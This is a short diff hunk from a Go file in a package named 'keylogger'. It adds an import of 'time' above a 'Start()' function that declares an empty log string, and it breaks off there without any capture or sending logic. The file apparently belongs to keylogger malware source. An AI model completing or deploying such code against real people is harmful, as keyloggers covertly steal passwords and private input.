@@ -1,5 +1,7 @@
 package keylogger
 
+import "time"
+
 func Start() {
 	var logString string = ""
 
